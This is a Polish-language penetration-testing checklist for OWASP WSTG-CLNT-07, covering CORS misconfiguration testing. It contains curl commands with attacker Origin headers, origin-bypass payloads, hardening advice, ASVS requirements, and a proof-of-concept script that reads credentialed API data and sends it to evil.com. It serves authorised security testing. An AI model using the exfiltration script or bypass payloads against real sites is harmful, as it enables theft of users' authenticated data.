# WSTG-CLNT-07 — Testing Cross Origin Resource Sharing (CORS)

## Cele

- Identify endpoints that implement CORS
- Ensure that the CORS configuration is secure or harmless

## KOMENDY

### Test CORS configuration

```bash
curl -sI "https://TARGET/api/data" -H "Origin: https://evil.com" | grep -i "access-control"
curl -sI "https://TARGET/api/data" -H "Origin: null" | grep -i "access-control"
curl -sI "https://TARGET/api/data" -H "Origin: https://TARGET.evil.com" | grep -i "access-control"
curl -sI "https://TARGET/api/data" -H "Origin: https://evilTARGET.com" | grep -i "access-control"

```

### Sprawdzenie niebezpiecznych konfiguracji

```bash
# Access-Control-Allow-Origin: * (z credentials)
# Access-Control-Allow-Origin: <reflected origin>
# Access-Control-Allow-Credentials: true

```

### Preflight request

```bash
curl -sI "https://TARGET/api/data" -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: PUT" | grep -i "access-control"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings CORS

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/CORS Misconfiguration/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Wyslij request z Origin: https://evil.com i sprawdz ACAO header
2. Testuj rozne warianty origin (null, subdomain, suffix)
3. Sprawdz czy ACAC: true jest ustawione z wildcard origin
4. Stworz PoC HTML z fetch() do testowania exfiltracji danych
5. Sprawdz czy pre-flight requests sa poprawnie obslugiwane


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — REST_Security_Cheat_Sheet.md, Cross_Site_Scripting_Prevention_Cheat_Sheet.md

### CORS — niebezpieczne konfiguracje

| Konfiguracja | Ryzyko |
|-------------|--------|
| `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` | **Krytyczne** — nie mozliwe technicznie, ale serwer moze reflectowac Origin |
| Origin reflected: `ACAO: <request Origin>` + `ACAC: true` | **Krytyczne** — kazda strona moze czytac dane z credentials |
| `ACAO: null` + `ACAC: true` | **Wysokie** — iframe z `sandbox` wysyla Origin: null |
| Wildcard subdomain: `*.target.com` | **Srednie** — XSS na subdomain = pelny dostep |
| Prefix/suffix match: `target.com.evil.com` | **Wysokie** — bledna walidacja origin |

### Prawidlowa konfiguracja CORS

- Uzywaj **allowlist** domen zamiast reflectowania Origin
- **NIGDY** nie uzywaj `Access-Control-Allow-Origin: *` z `Access-Control-Allow-Credentials: true`
- Nie akceptuj `Origin: null`
- Ogranicz `Access-Control-Allow-Methods` do potrzebnych metod
- Ogranicz `Access-Control-Allow-Headers` do potrzebnych naglowkow
- Ustaw `Access-Control-Max-Age` na rozsadna wartosc (np. 3600)
- Waliduj Origin **scisle**: exact match, nie prefix/suffix/contains

### Testowanie CORS — payloady Origin

- `Origin: https://evil.com` — calkowicie obca domena
- `Origin: null` — sandbox iframe, data: URL
- `Origin: https://target.com.evil.com` — suffix match bypass
- `Origin: https://eviltarget.com` — prefix match bypass
- `Origin: https://subdomain.target.com` — subdomain wildcard
- `Origin: https://target.com%60evil.com` — special char bypass

### Exploit CORS misconfiguration

```html
<script>
fetch('https://target.com/api/sensitive', {credentials: 'include'})
.then(r => r.json())
.then(d => fetch('https://evil.com/steal?data=' + JSON.stringify(d)))
</script>
```

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Additional CORS Checks | Testowanie blednych konfiguracji CORS | [GitHub](https://github.com/ybieri/Additional_CORS_Checks) |

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L1 (Podstawowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V3.4.2 | Browser Security Mechanism Headers | Verify that the Cross-Origin Resource Sharing (CORS) Access-Control-Allow-Origin header field is a fixed value by the application, or if the Origin HTTP request header field value is used, it is validated against an allowlist of trusted origins. When 'Access-Control-Allow-Origin: *' needs to be used, verify that the response does not include any sensitive information. |

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V3.5.4 | Browser Origin Separation | Verify that separate applications are hosted on different hostnames to leverage the restrictions provided by same-origin policy, including how documents or scripts loaded by one origin can interact with resources from another origin and hostname-based restrictions on cookies. |


---

## HackTricks Tips

- **Origin reflection test**: wyślij `Origin: https://attacker.com` — jeśli echoed z `Allow-Credentials: true` = full read
- **Null origin bypass**: sandboxed iframe (`srcdoc`) wysyła `Origin: null`
- **Regex bypass — underscores**: Chrome/Firefox accept `_` w subdomains → `target.application_.attacker.com`
- **Safari special chars**: `)`, `{`, `}` accepted w Origin domain
- **DNS rebinding**: Singularity; `0.0.0.0` na Linux/macOS (providers block `127.0.0.1` ale accept `0.0.0.0`)
- **Client-side cache poisoning**: reflect custom header z `<svg/onload=...>` bez `Vary: Origin`
